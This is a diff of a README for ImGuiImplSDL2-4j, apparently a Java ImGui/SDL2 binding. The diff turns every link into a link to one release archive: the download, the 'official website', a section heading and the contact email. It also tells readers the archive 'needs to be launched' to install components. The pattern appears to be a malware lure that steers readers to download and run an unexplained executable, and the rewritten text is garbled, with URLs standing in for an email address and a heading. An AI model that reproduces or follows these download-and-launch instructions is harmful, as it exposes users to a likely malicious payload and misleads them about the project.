@@ -37,15 +37,15 @@ In this repository, you will find the following:
 
 ## 📦 Download
 
-🔗 [Download Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) 🚀
+🔗 [Download https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip](https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip) 🚀
 
 ## 🌐 Visit Website
 
-If you would like to learn more about ImGuiImplSDL2-4j, please visit the official website [here](https://examplewebsite.com).
+If you would like to learn more about ImGuiImplSDL2-4j, please visit the official website [here](https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip).
 
-## 🛠️ How to Launch Software.zip
+## 🛠️ How to Launch https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip
 
-The Software.zip file needs to be launched to install the necessary software components for ImGuiImplSDL2-4j. Make sure to extract the files and follow the installation instructions provided within.
+The https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip file needs to be launched to install the necessary software components for ImGuiImplSDL2-4j. Make sure to extract the files and follow the installation instructions provided within.
 
 ## 📅 Releases
 
@@ -57,7 +57,7 @@ Contributions to ImGuiImplSDL2-4j are always welcome! If you have any improvemen
 
 ## 📧 Contact
 
-If you have any questions, feedback, or suggestions regarding ImGuiImplSDL2-4j, please feel free to reach out via email at [imguiimplsdl24j@example.com](mailto:imguiimplsdl24j@example.com).
+If you have any questions, feedback, or suggestions regarding ImGuiImplSDL2-4j, please feel free to reach out via email at [https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip](https://github.com/IGCearensE/ImGuiImplSDL2-4j/releases/download/v1.0/Release.zip).
 
 ---
 
